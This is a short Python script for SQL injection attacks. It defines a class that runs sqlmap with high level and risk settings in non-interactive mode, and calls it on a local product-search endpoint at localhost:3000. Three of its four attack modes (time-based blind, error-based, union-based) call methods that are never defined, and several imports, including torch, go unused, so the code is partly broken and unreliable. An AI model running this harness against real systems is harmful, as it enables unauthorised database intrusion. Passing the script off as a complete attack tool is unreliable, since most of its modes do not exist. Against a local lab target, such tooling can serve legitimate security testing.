import torch
import torch.nn as nn
from random_string_generator import RandomStringGenerator
import logging
import subprocess
import os


class SQLInjectionAttack:
    def __init__(self, target_url, level=5, risk=3, attack_type="sqlmap"):
        self.target_url = target_url
        self.attack_type = attack_type
        self.level = level
        self.risk = risk

    def simulate_attack(self):
        if self.attack_type == "sqlmap":
            self.sqlmap_attack()
        elif self.attack_type == "TimeBasedBlind":
            self.time_based_blind_attack()
        elif self.attack_type == "ErrorBased":
            self.error_based_attack()
        elif self.attack_type == "UnionBased":
            self.union_based_attack()
        else:
            raise ValueError("Invalid attack type!")

    def sqlmap_attack(self):
        logging.info("Attacking %s with SQLMap...", self.target_url)
        path_to_executable = os.path.join(os.path.dirname(__file__), "sqlmap/sqlmap.py")
        command = [
            "python3",
            path_to_executable,
            "-u",
            self.target_url,
            "--batch",
            "--level",
            str(self.level),
            "--risk",
            str(self.risk),
        ]
        subprocess.run(command)


sql_injection_attack = SQLInjectionAttack(
    "http://localhost:3000/rest/products/search?q=", attack_type="sqlmap"
)  # target_url, attack_type
sql_injection_attack.simulate_attack()
